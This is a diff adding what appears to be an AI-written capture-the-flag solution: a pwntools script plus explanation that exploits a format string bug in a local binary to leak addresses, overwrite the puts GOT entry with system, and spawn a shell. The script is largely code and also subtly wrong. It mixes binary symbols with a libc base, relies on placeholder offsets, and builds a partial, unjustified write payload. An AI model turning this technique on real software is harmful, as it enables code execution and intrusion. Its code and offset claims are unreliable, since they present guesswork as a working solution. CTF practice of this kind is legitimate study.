@@ -1,0 +1,98 @@
+To solve this challenge using `pwntools`, we need to exploit the format string vulnerability in the `printf` function. The `printf` function is called with user-controlled input, which can lead to a format string vulnerability. We can use this to leak addresses or overwrite function pointers.
+
+Here are the steps and the corresponding code to solve the challenge:
+
+### Steps
+
+1. **Identify the Format String Vulnerability**: The `printf` function is called with user-controlled input, which can be exploited.
+2. **Leak an Address**: Use the format string vulnerability to leak an address from the stack or a known function pointer.
+3. **Calculate the Base Address of libc**: Use the leaked address to calculate the base address of the `libc` library.
+4. **Overwrite a Function Pointer**: Overwrite a function pointer (e.g., `puts`) with the address of `system`.
+5. **Trigger the Exploit**: Trigger the exploit to execute `system("/bin/sh")`.
+
+### Code
+
+```python
+from pwn import *
+
+# Set up the process
+binary_path = './fmt'
+elf = ELF(binary_path)
+p = process(binary_path)
+
+# Set up the context
+context.binary = elf
+context.log_level = 'debug'
+
+# Leak an address to find the base address of libc
+def leak_address():
+    payload = b'%11$p'
+    p.sendline(payload)
+    p.recvuntil('Do you know repeater?\n')
+    leaked_address = int(p.recvline().strip(), 16)
+    return leaked_address
+
+# Calculate the base address of libc
+def calculate_libc_base(leaked_address):
+    # The leaked address is the address of __libc_start_main + 240
+    # Adjust this value based on the actual offset in your environment
+    libc_base = leaked_address - 0x1b000  # Example offset, adjust as needed
+    return libc_base
+
+# Overwrite the got entry of puts with the address of system
+def overwrite_got_with_system(libc_base):
+    system_addr = libc_base + elf.symbols['system']
+    puts_got = elf.got['puts']
+    payload = b''.join([
+        b'%79c',  # Adjust the number of characters to match the offset
+        b'%7$hn',  # Write the lower 16 bits
+        b'A' * (100 - len(b'%79c%7$hn')),
+        p32(puts_got),
+    ])
+    p.sendline(payload)
+
+# Trigger the exploit to execute system("/bin/sh")
+def trigger_exploit():
+    payload = b'/bin/sh\x00'
+    p.sendline(payload)
+
+# Main exploit
+if __name__ == '__main__':
+    leaked_address = leak_address()
+    log.info(f'Leaked address: {hex(leaked_address)}')
+
+    libc_base = calculate_libc_base(leaked_address)
+    log.info(f'Libc base address: {hex(libc_base)}')
+
+    overwrite_got_with_system(libc_base)
+
+    trigger_exploit()
+
+    # Interact with the shell
+    p.interactive()
+```
+
+### Explanation
+
+1. **Leak an Address**:
+   - We use the format string `%11$p` to leak the address of `__libc_start_main + 240`. This address is typically the 11th argument passed to `printf`.
+   - The leaked address is then used to calculate the base address of `libc`.
+
+2. **Calculate the Base Address of libc**:
+   - The base address of `libc` is calculated by subtracting a known offset from the leaked address. The offset `0x1b000` is an example and may need to be adjusted based on your specific environment.
+
+3. **Overwrite the GOT Entry**:
+   - We overwrite the GOT entry of `puts` with the address of `system`. This is done using a format string attack to write the address of `system` into the GOT entry of `puts`.
+   - The payload is constructed to write the lower 16 bits of the address first, followed by the higher 16 bits if necessary.
+
+4. **Trigger the Exploit**:
+   - We send the string `/bin/sh` to the program, which will now be executed by `system` instead of `puts`.
+
+5. **Interact with the Shell**:
+   - Finally, we interact with the shell to gain control.
+
+### Notes
+
+- The offsets and addresses may vary depending on the specific version of `libc` and the binary. You may need to adjust the offsets and addresses accordingly.
+- Ensure that you have the correct version of `libc` and that the offsets match the ones in your environment.
+- The payload construction may need to be adjusted based on the exact behavior of the format string vulnerability in the binary.
